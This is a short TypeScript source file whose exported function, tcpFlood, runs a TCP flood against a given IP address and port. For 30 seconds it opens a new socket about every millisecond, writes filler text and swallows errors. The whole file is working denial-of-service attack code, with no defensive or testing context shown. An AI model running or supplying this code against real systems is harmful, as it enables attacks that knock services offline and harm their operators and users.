import { Socket } from 'net';

const attackDuration = 30000;

const data = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.';

export async function tcpFlood (ip: string, port: number): Promise<void> {
  console.log(`starting tcp flood ${ip}:${port}`);
  const startTime = new Date();

  return new Promise((resolve) => {
    let tcpRequest = () => {
      try {
        let client = new Socket();

        client.connect(port, ip, function () {
          client.write(data);
          client.end();
        });

        client.on('error', () => {
          // swallow errors
          return;
        });
      } catch (error) {
        console.error('error while doing tcpRequest', error);
      }

      if (Date.now() - startTime.getTime() < attackDuration) {
        setTimeout(tcpRequest, 1);
      } else {
        resolve();
        console.log(`stopping tcp flood ${ip}:${port}`);
      }
    };

    tcpRequest();
  });
}
